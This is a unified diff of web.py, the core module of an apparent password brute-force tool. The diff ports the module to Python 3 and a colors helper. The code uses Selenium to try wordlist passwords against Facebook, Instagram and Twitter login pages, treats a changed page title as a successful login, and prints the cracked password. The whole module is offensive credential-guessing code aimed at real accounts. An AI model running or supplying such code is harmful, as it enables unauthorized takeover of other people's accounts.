@@ -1,39 +1,24 @@
  # -*- coding: utf-8 -*-
+"""
+web.py
 
-'''
-web.py - Core module for web-based services bruteforce.
+    Core module for web-based services bruteforce.
 
-Category: Core
-Description:
     This module provides the methods for bruteforcing web-based services.
     Most of these are built upon the Selenium library for webscraping and manipulation.
     These include:
     - facebook
     - instagram
     - twitter
+"""
 
-    These are some of the more common web services that have presented vulnerabilities in
-    their authentication in the past. NOTE that rate-limiting may be present within their
-    respective login forms, so timeouts delays are reinforced.
-
-Dependencies: selenium
-
-Version: v1.0.0
-Author: ex0dus
-License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0
-
-'''
-
-from consts import *
+import brute.colors
 
 from xmpp import Client
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import NoSuchElementException
 
-# Assert: If specified string is NOT found, that means that user has succcessfully logged in.
-# The specified string usually means that the search query is erroneous, meaning that no
-# page for the specified user exists.
 
 class WebBruteforce(object):
     def __init__(self, service, username, wordlist, delay):
@@ -43,13 +28,13 @@ class WebBruteforce(object):
         self.delay = delay
 
     def execute(self):
-        print P + "[*] Checking if username exists..." + W
+        print(P, "[*] Checking if username exists...", W)
         if self.usercheck(self.username, self.service) == 1:
-            print R + "[!] The username was not found! Exiting..." + W
+            colors.error("[!] The username was not found! Exiting...")
             exit()
-        print G + "[*] Username found! Continuing..." + W
+        colors.good("[*] Username found! Continuing...")
         sleep(1)
-        print "Using %s seconds of delay. Default is 1 second" % self.delay
+        print("Using {} seconds of delay. Default is 1 second".format(self.delay))
         self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
     def usercheck(self, username, service):
@@ -122,14 +107,14 @@ class WebBruteforce(object):
                 elif service == "instagram":
                     assert (("Instagram") in driver.title)
 
-                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
+                colors.warn("[*] Username: {} | [*] Password: {} | Incorrect!\n".format(username, password))
                 sleep(delay)
 
             except AssertionError:
                 # AssertionError: successful login, since we do not see the string in the title, meaning
                 # that the page has changed.
-                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
+                colors.good("[*] Username: {} | [*] Password found: {}\n".format(username, password))
                 exit(0)
             except Exception as e:
-                print R + ("Error caught! %s" % e) + W
+                colors.error("Error caught! {}".format(e))
                 exit(1)
